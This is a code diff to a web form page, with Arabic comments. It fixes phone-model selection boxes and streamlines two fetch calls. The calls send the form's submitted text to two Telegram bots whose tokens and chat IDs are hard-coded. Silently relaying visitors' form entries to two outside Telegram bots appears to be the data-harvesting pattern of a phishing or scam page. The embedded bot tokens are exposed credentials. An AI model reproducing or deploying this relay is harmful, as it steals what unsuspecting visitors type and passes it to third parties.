@@ -315,12 +315,16 @@ document.getElementById("formPage").style.display="none";
 document.getElementById("welcome").style.display="flex";
 }
 
+/* اصلاح مشكلة نوع الهاتف */
+
 function showPhoneModel(name){
 document.getElementById("phoneModelBox").style.display="block";
+document.getElementById("otherPhoneBox").style.display="none";
 document.getElementById("phoneModel").placeholder=name;
 }
 
 function showOtherPhone(){
+document.getElementById("phoneModelBox").style.display="none";
 document.getElementById("otherPhoneBox").style.display="block";
 }
 
@@ -391,18 +395,14 @@ let text=
 let token1="8620736182:AAFwcp0fsNH7WSiPm2AVDh3qWrsCf_m4ZTA";
 let chat_id1="8331036866";
 
-let url1="https://api.telegram.org/bot"+token1+"/sendMessage?chat_id="+chat_id1+"&text="+text;
-
-fetch(url1);
+fetch("https://api.telegram.org/bot"+token1+"/sendMessage?chat_id="+chat_id1+"&text="+text);
 
 /* البوت الثاني */
 
 let token2="8735950920:AAFIiYgDxL541JNKQXtcQk4aDYDAJrPptjU";
 let chat_id2="8285024067";
 
-let url2="https://api.telegram.org/bot"+token2+"/sendMessage?chat_id="+chat_id2+"&text="+text;
-
-fetch(url2);
+fetch("https://api.telegram.org/bot"+token2+"/sendMessage?chat_id="+chat_id2+"&text="+text);
 
 document.getElementById("successMessage").style.display="block";
 document.getElementById("successMessage").innerHTML=
